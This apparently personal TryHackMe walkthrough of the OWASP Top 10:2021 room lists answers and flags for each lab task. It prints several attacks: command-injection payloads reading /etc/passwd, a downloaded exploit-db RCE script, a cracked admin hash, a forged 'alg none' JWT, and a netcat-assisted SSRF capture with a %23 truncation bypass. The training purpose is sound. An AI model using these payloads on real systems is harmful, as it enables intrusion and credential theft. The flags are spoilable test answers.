---
title: OWASP Top 10 - 2021
date: 2025-11-08
draft: false
tags:
  - TryHackMe
  - Cybersecurity
  - OWASP
---
*At the time of writing this, the OWASP Top 10:2025 is in its 'Release Candidate Phase'. Seems like a good opportunity to familiarize yourself with OWASP Top 10:2021 to understand the changes that have been taken place.*
 
**Note:** 

- The questions are shortened for a cleaner view.
- Questions that are straightforward will only have answers attached. Such questions can be easily answered by reading the documentation given in the room.
- Only questions that require an answer will be counted. 

## Task 1 to 3 

No answer needed

---
## Task 4 - Broken Access Control (IDOR Challenge)

#### 1) Look at other users' notes. What is the flag?

*We can try different `note_id` numbers and see what different messages we get.*

*On note_id 5 we get the following message or note.*

`Hint: Do note_ids start from 1? Maybe go lower ;)`

*This implies we need to go lower than 1 and on `note_id=0` we get the flag.*

**Ans:** `flag{fivefourthree}`

#### 2) Burp Suite is frequently used when attacking...?

**Ans:** `mobile`

---

## Task 5 to 7 

No answer needed

---
## Task 8 - Cryptographic Failures (Challenge)

#### 1) What is the name of the mentioned directory?

*By inspecting the `login` page's source code we can find a comment that says this:*

```html
<!--Must remember to do something better with the database than store it in /assets...--> 
```

**Ans:**  `assets`

#### 2) What file stands out as being likely to contain sensitive data?

*Head over to /assets and observe the last entry.*

**Ans:**  `webapp.db`

#### 3) What is the password hash of the admin user?

*I downloaded the `webapp.db` file and opened it on my attack box, and proceeded to get the information of various users via the GUI. You can use the terminal if you prefer.*

*The `admin` account has the following hash for the password:  `6eea9b7ef19179a06954edd0f6c05ceb`*

**Ans:**  `6eea9b7ef19179a06954edd0f6c05ceb`

#### 4) What is the admin's plaintext password?

*I decided to use `crackstation` to crack the hash*

**Ans:**  `qwertyuiop`

#### 5) Log in as the admin. What is the flag?

*Enter the username as `admin` and `qwertyuiop` for the password.*

**Ans:**  `THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl}`

----
## Task 9

No answer needed.

---
## Task 10 - 3.1. Command Injection

#### 1) What strange text file is in the website's root directory?

*Inject the following command by providing it as the input:*

```bash
$(ls)
```

```bash
< css drpepper.txt index.php js >
 ------------------------------- 
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
```

**Ans:**  `drpepper.txt`

#### 2) How many non-root/non-service/non-daemon users are there?

*Inject the following command by providing it as the input:*

```bash 
$(cat /etc/passwd)
```

```bash
 _________________________________________ 
/ root:x:0:0:root:/root:/bin/ash          \
| bin:x:1:1:bin:/bin:/sbin/nologin        |
| daemon:x:2:2:daemon:/sbin:/sbin/nologin |
| adm:x:3:4:adm:/var/adm:/sbin/nologin    |
| lp:x:4:7:lp:/var/spool/lpd:/sbin/nologi |
| n sync:x:5:0:sync:/sbin:/bin/sync       |
| shutdown:x:6:0:shutdown:/sbin:/sbin/shu |
| tdown halt:x:7:0:halt:/sbin:/sbin/halt  |
| mail:x:8:12:mail:/var/mail:/sbin/nologi |
| n                                       |
| news:x:9:13:news:/usr/lib/news:/sbin/no |
| login                                   |
| uucp:x:10:14:uucp:/var/spool/uucppublic |
| :/sbin/nologin                          |
| operator:x:11:0:operator:/root:/sbin/no |
| login                                   |
| man:x:13:15:man:/usr/man:/sbin/nologin  |
| postmaster:x:14:12:postmaster:/var/mail |
| :/sbin/nologin                          |
| cron:x:16:16:cron:/var/spool/cron:/sbin |
| /nologin                                |
| ftp:x:21:21::/var/lib/ftp:/sbin/nologin |
| sshd:x:22:22:sshd:/dev/null:/sbin/nolog |
| in                                      |
| at:x:25:25:at:/var/spool/cron/atjobs:/s |
| bin/nologin                             |
| squid:x:31:31:Squid:/var/cache/squid:/s |
| bin/nologin xfs:x:33:33:X Font          |
| Server:/etc/X11/fs:/sbin/nologin        |
| games:x:35:35:games:/usr/games:/sbin/no |
| login                                   |
| cyrus:x:85:12::/usr/cyrus:/sbin/nologin |
| vpopmail:x:89:89::/var/vpopmail:/sbin/n |
| ologin                                  |
| ntp:x:123:123:NTP:/var/empty:/sbin/nolo |
| gin                                     |
| smmsp:x:209:209:smmsp:/var/spool/mqueue |
| :/sbin/nologin                          |
| guest:x:405:100:guest:/dev/null:/sbin/n |
| ologin                                  |
| nobody:x:65534:65534:nobody:/:/sbin/nol |
| ogin                                    |
| apache:x:100:101:apache:/var/www:/sbin/ |
\ nologin                                 /
 ----------------------------------------- 
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
```

*You can research a bit about process ids but none of them here are non-root*

**Ans:**  `0`

#### 3) What user is this app running as?

*Inject the following command by providing it as the input:*

```bash
$(id)
```

```bash
 _________________________________________ 
/ uid=100(apache) gid=101(apache)         \
| groups=82(www-data),101(apache),101(apa |
\ che)                                    /
 ----------------------------------------- 
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
```

**Ans:**  `apache`
#### 4) What is the user's shell set as?

*Injecting `$SHELL` doesn't work so we can just look at our `cat /etc/passwd` output again and observe the `apache` entry.*

**Ans:**  `/sbin/nologin`
#### 5) What version of Alpine Linux is running?

*Inject the following command by providing it as the input:*

```bash
$(cat /etc/os-release)
```

```bash
 _________________________________________ 
/ NAME="Alpine Linux" ID=alpine           \
| VERSION_ID=3.16.0 PRETTY_NAME="Alpine   |
| Linux v3.16"                            |
| HOME_URL="https://alpinelinux.org/"     |
| BUG_REPORT_URL="https://gitlab.alpineli |
\ nux.org/alpine/aports/-/issues"         /
 ----------------------------------------- 
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
```

**Ans:**  `3.16.0`

---
## Task 10 

No answer needed

---
## Task 11 - 4.Insecure Design

#### 1) What is the value of the flag in joseph's account?

*Click on. the forgot password link -> enter `joseph` as the username -> Select option 2 and enter `green` as the favourite colour.*

*The answer was found just by inputting random colour values and `green` just happened to be the one.*

*Once logged in, navigate to `flag.txt` and open it to reveal the flag.*

**Ans:**  `THM{Not_3ven_c4tz_c0uld_sav3_U!}`

---
## Task 12 - 5. Security Misconfiguration

#### 1)  What is the database file name in the current directory?

*After running the command given in the room we get the following output:*

```bash
total 24
-rw-r--r--    1 root     root           249 Sep 15  2022 Dockerfile
-rw-r--r--    1 root     root          1411 Feb  3  2023 app.py
-rw-r--r--    1 root     root           137 Sep 15  2022 requirements.txt
drwxr-xr-x    2 root     root          4096 Sep 15  2022 templates
-rw-r--r--    1 root     root          8192 Sep 15  2022 todo.db
```

**Ans:**  `todo.db`

#### 2) What is the value of the `secret_flag` variable in the source code?

*Run the following command:*

```python
import os; print(os.popen("cat app.py").read())
```

*We get the following output:*

```python
import os
from flask import Flask, render_template, request, redirect, url_for
from flask_sqlalchemy import SQLAlchemy

secret_flag = "THM{Just_a_tiny_misconfiguration}"

PROJECT_ROOT = os.path.dirname(os.path.realpath(__file__))
DATABASE = os.path.join(PROJECT_ROOT, 'todo.db')

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = "sqlite:////" + DATABASE
db = SQLAlchemy(app)


class Todo(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    title = db.Column(db.String(80))
    complete = db.Column(db.Boolean)


@app.route("/")
def index():
    todo_list = Todo.query.all()
    return render_template("index.html", todo_list=todo_list)


@app.route("/add", methods=["POST"])
def add():
    title = request.form.get("title")
    new_todo = Todo(title=title, complete=False)
    db.session.add(new_todo)
    db.session.commit()
    return redirect(url_for("index"))


@app.route("/complete/<string:todo_id>")
def complete(todo_id):
    todo = Todo.query.filter_by(id=todo_id).first()
    todo.complete = not todo.complete
    db.session.commit()
    return redirect(url_for("index"))


@app.route("/delete/<string:todo_id>")
def delete(todo_id):
    todo = Todo.query.filter_by(id=todo_id).first()
    db.session.delete(todo)
    db.session.commit()
    return redirect(url_for("index"))


if __name__ == "__main__":
    db.create_all()
    app.run(host='0.0.0.0', port=5000, debug=True)

```

**Ans:**  `THM{Just_a_tiny_misconfiguration}`

---
## Task 13 to 14 

No answer needed

---
## Task 15 - Vulnerable and Outdated Components - Lab

#### 1) What is the content of the /opt/flag.txt file?

*This requires a bit of research, If you try searching online you'll eventually stumble upon tis page:*

`https://www.exploit-db.com/exploits/47887`

*You can download and run the exploit code.*

```bash
python3 47887.py http://10.48.174.113:84
```

*One you've got RCE, cat the flag:*

```bash 
cat /opt/flag.txt
```

**Ans:**  `THM{But_1ts_n0t_my_f4ult!}`

---
## Task 16 

No answer needed

---
## Task 17 - Identification and Authentication Failures Practical

#### 1) What is the flag that you found in darren's account?

*Register using " darren" and login.*

**Ans:** `fe86079416a21a3c99937fea8874b667`
#### 2) What is the flag that you found in arthur's account?

*Register using " arthur" and login.*

**Ans:** `d9ac0f7db4fda460ac3edeb75d75e16e `

---
## Task 18 

No answer needed

---

## Task 19 - Software Integrity Failures

#### 1) What is the SHA-256 hash of...?

*Visit `www.srihash.org` to generate the `SHA-256` hash of the url.*

```html
<script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
```

**Ans:** `sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=`

---
## Task 20 - Data Integrity Failures

#### 1) What is guest's account password?

*Simply using `guest` as the password worked.*

**Ans:** `guest`

#### 2) What is the name of the website's cookie containing a JWT token?

**Ans:** `jwt-session`

#### 3) What is the flag presented to the admin user?

*First, decode the session string from Base64:*

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNjY1MDc2ODM2fQ.
```

```
{"typ":"JWT","alg":"HS256"}{"username":"guest","exp":1665076836}
```

*Change the values and then encode it again:*

```
{"typ":"JWT","alg":"none"}{"username":"admin","exp":1665076836}
```

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjY1MDc2ODM2fQ==.
```

*Do note that you have encode and decode each part of the token separately and then restructure the token. Also do not forget to add `.` at the end.*

**Ans:** `THM{Dont_take_cookies_from_strangers}`

---
## Task 21 - 9. Security Logging and Monitoring Failures

*Here are the contents of the log file:*

```
200 OK           12.55.22.88 jr22          2019-03-18T09:21:17 /login
200 OK           14.56.23.11 rand99        2019-03-18T10:19:22 /login
200 OK           17.33.10.38 afer11        2019-03-18T11:11:44 /login
200 OK           99.12.44.20 rad4          2019-03-18T11:55:51 /login
200 OK           67.34.22.10 bff1          2019-03-18T13:08:59 /login
200 OK           34.55.11.14 hax0r         2019-03-21T16:08:15 /login
401 Unauthorised 49.99.13.16 admin         2019-03-21T21:08:15 /login
401 Unauthorised 49.99.13.16 administrator 2019-03-21T21:08:20 /login
401 Unauthorised 49.99.13.16 anonymous     2019-03-21T21:08:25 /login
401 Unauthorised 49.99.13.16 root          2019-03-21T21:08:30 /login 
```

#### 1) What IP address is the attacker using?

*That would be the `anonymous` address.*

**Ans:** `49.99.13.16`

#### 2) What kind of attack is being carried out?

**Ans:** `Brute Force`

---
## Task 22 - 10. Server-Side Request Forgery (SSRF)

#### 1) What is the only host allowed to access the admin area?

**Ans:** `localhost`

#### 2) Where does the server parameter point to?

*Hover over the button, you should see the URL.*

**Ans:** `secure-file-storage.com`

#### 3) Are there any API keys in the intercepted request?

*Start a `netcat` session:*

```bash
nc -lvp 8080
```

*Modify the URL to include you machine's IP:*

```
http://10.48.174.113:8087/download?server=10.48.98.128:8080&id=75482342
```

```bash
Listening on 0.0.0.0 8080
Connection received on 10.48.174.113 51872
GET /public-docs-k057230990384293/75482342.pdf HTTP/1.1
Host: 10.48.98.128:8080
User-Agent: PycURL/7.45.1 libcurl/7.83.1 OpenSSL/1.1.1q zlib/1.2.12 brotli/1.0.9 nghttp2/1.47.0
Accept: */*
X-API-KEY: THM{Hello_Im_just_an_API_key}
```

**Ans:** `THM{Hello_Im_just_an_API_key}`

---
### Going the Extra Mile:

*We cannot just use `10.48.174.113:8087/download?server=http://localhost:8087&id=75482342` and here is the reason why:*

If an app allows:

`/download?server=http://localhost:8087&id=...`

and then internally does:

`requests.get(server + "/view")`

it requests:

`http://localhost:8087/view`

But with:

`/download?server=http://localhost:8087/admin%23&id=...`

it decodes to:

`http://localhost:8087/admin#/view`

and requests:

`http://localhost:8087/admin`

so the attacker can hit `/admin`  instead of `/view`.

|Aspect|No `%23`|With `%23`|
|---|---|---|
|Sent to server|Normal text|Encoded `#` (%23)|
|Decoded value|`http://localhost:8087`|`http://localhost:8087/admin#`|
|Effect|Appends whatever app adds|Truncates anything appended|
|Use case|Normal request|Used to bypass filters / cut off unwanted parts in SSRF|

*Using `%23` turns into a `#` after decoding, which stops the URL right there - the rest of the path is ignored, letting an attacker control exactly what part of the internal site gets hit.*

*Hence the final URL is:*

```
10.48.174.113:8087/download?server=http://localhost:8087/admin%23&id=75482342
```

*The page will be downloaded.*

**Ans:** `thm{c4n_i_haz_flagz_plz?}`

---

